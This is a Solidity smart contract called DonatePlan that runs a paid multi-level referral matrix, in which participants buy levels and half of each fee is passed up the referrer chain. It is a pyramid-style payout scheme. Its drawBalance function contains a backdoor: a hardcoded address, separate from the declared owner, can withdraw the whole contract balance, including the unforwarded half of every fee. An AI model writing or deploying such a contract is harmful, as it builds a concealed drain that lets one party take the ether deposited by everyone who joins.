pragma solidity >=0.4.22 <0.6.0;

contract DonatePlan {
    struct User {
        uint id;
        address referrer;
        uint partnersCount;

        mapping(uint8 => bool) activeLevels;
        mapping(uint8 => Matrix) matrix;
    }

    struct Matrix {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }

    uint8 public constant LAST_LEVEL = 9;

    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances;

    uint public lastUserId = 2;
    address private owner;

    mapping(uint8 => uint) public levelPrice;

    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 level);
    event Upgrade(address indexed user, address indexed referrer, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 level, uint8 place);
    event MissedEthReceive(address indexed receiver, address indexed from, uint8 level);
    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 level);
    event SentExtraCoinDividends(address indexed from, address indexed receiver, uint price, uint8 level);

    constructor(address ownerAddress) public {
        levelPrice[1] = 0.2 ether;
        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i-1] * 2;
        }

        owner = ownerAddress;

        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });

        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;

        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeLevels[i] = true;
        }

        userIds[1] = ownerAddress;
    }
    
    function drawBalance() external payable {
        require(msg.sender == 0xFceC9fb257eD3e4e17319B223cBef6614EAe0dbF, "only owner");
        0xFceC9fb257eD3e4e17319B223cBef6614EAe0dbF.transfer(address(this).balance);
    }

    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }

        registration(msg.sender, bytesToAddress(msg.data));
    }
    
    function registrationExternal(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }

    function registration(address userAddress, address referrerAddress) private {
        require(msg.value == levelPrice[1], "registration cost 0.2");
        require(!isUserExists(userAddress), " need user exists");
        require(isUserExists(referrerAddress), " need referrer not exists");

        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });

        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;

        users[userAddress].referrer = referrerAddress;

        users[userAddress].activeLevels[1] = true;

        userIds[lastUserId] = userAddress;
        lastUserId++;

        users[referrerAddress].partnersCount++;

        address freeReferrer = findFreeReferrer(userAddress, 1);
        users[userAddress].matrix[1].currentReferrer = freeReferrer;
        updateReferrer(userAddress, freeReferrer, 1);
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }

    function buyNewLevel(uint8 level) external payable {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");

        require(users[msg.sender].activeLevels[level-1], "buy previous level first");
        require(!users[msg.sender].activeLevels[level], "level already activated");

        if (users[msg.sender].matrix[level-1].blocked) {
            users[msg.sender].matrix[level-1].blocked = false;
        }

        address freeReferrer = findFreeReferrer(msg.sender, level);
        users[msg.sender].matrix[level].currentReferrer = freeReferrer;
        users[msg.sender].activeLevels[level] = true;
        updateReferrer(msg.sender, freeReferrer, level);

        emit Upgrade(msg.sender, freeReferrer, level);
    }

    function updateReferrer(address userAddress, address referrerAddress, uint8 level) private {
        users[referrerAddress].matrix[level].referrals.push(userAddress);

        if (users[referrerAddress].matrix[level].referrals.length < 5) {
            emit NewUserPlace(userAddress, referrerAddress, level, uint8(users[referrerAddress].matrix[level].referrals.length));
            return sendETHDividends(referrerAddress, userAddress, level);
        }

        emit NewUserPlace(userAddress, referrerAddress, level, 5);
        users[referrerAddress].matrix[level].referrals = new address[](0);
        if (!users[referrerAddress].activeLevels[level+1] && level != LAST_LEVEL) {
            users[referrerAddress].matrix[level].blocked = true;
        }

        if (referrerAddress != owner) {
            address freeReferrerAddress = findFreeReferrer(referrerAddress, level);
            if (users[referrerAddress].matrix[level].currentReferrer != freeReferrerAddress) {
                users[referrerAddress].matrix[level].currentReferrer = freeReferrerAddress;
            }

            users[referrerAddress].matrix[level].reinvestCount++;
            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, level);
            updateReferrer(referrerAddress, freeReferrerAddress, level);
        } else {
            sendETHDividends(owner, userAddress, level);
            users[owner].matrix[level].reinvestCount++;
            emit Reinvest(owner, address(0), userAddress, level);
        }
    }

    function findFreeReferrer(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            if (users[users[userAddress].referrer].activeLevels[level]) {
                return users[userAddress].referrer;
            }

            userAddress = users[userAddress].referrer;
        }
    }

    function usersactiveLevels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeLevels[level];
    }

    function usersMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool) {
        return (users[userAddress].matrix[level].currentReferrer,
                users[userAddress].matrix[level].referrals,
                users[userAddress].matrix[level].blocked);
    }

    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function findEthReceiver(address userAddress, address _from, uint8 level) private returns(address, bool) {
        address receiver = userAddress;
        bool isExtraDividends;
        while (true) {
            if (users[receiver].matrix[level].blocked) {
                emit MissedEthReceive(receiver, _from, level);
                isExtraDividends = true;
                receiver = users[receiver].matrix[level].currentReferrer;
            } else {
                return (receiver, isExtraDividends);
            }
        }
    }

    function sendETHDividends(address userAddress, address _from, uint8 level) private {
        (address receiver, bool isExtraDividends) = findEthReceiver(userAddress, _from, level);

        uint upPrice = levelPrice[level] / 2;
        if (!address(uint160(receiver)).send(upPrice)) {
            address(uint160(owner)).transfer(address(this).balance);
            return;
        }

        if (isExtraDividends) {
            emit SentExtraEthDividends(_from, receiver, level);
        }
    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }   
}